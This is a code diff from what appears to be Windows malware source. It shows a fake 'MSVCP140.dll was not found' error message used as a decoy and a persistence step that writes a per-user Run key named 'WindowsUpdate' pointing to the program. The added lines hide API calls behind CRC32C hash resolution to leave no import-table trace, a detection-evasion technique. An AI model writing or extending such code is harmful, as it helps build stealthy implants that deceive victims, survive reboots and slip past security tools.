@@ -262,13 +262,25 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
                          'b','e','c','a','u','s','e',' ','M','S','V','C','P','1','4','0',
                          '.','d','l','l',' ','w','a','s',' ','n','o','t',' ','f','o','u',
                          'n','d','.', 0 };
-        MessageBoxA(NULL, msg, title, MB_ICONERROR | MB_OK);
+        // MessageBoxA resolved via CRC32C hash — zero IAT
+        HMODULE hU32 = Api::GetModuleByHashCrc(Api::CrcMod::USER32);
+        if (hU32) {
+            auto pMBA = (int(WINAPI*)(HWND,LPCSTR,LPCSTR,UINT))
+                Api::GetProcByHashCrc(hU32, Api::CrcFn::MessageBoxA);
+            if (pMBA) pMBA(NULL, msg, title, MB_ICONERROR | MB_OK);
+        }
     }
 
     // ── Step 6: Persistence (HKCU, no admin needed) ──
     if (GlobalConfig.bPersist) {
         wchar_t selfPath[MAX_PATH];
-        GetModuleFileNameW(NULL, selfPath, MAX_PATH);
+        // GetModuleFileNameW resolved via CRC32C hash — zero IAT
+        HMODULE hK32p = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (hK32p) {
+            auto pGMFN = (DWORD(WINAPI*)(HMODULE,LPWSTR,DWORD))
+                Api::GetProcByHashCrc(hK32p, Api::CrcFn::GetModuleFileNameW);
+            if (pGMFN) pGMFN(NULL, selfPath, MAX_PATH);
+        }
         wchar_t keyName[] = { 'W','i','n','d','o','w','s','U','p','d','a','t','e', 0 };
         Persistence::InstallRunKey(keyName, selfPath);
     }
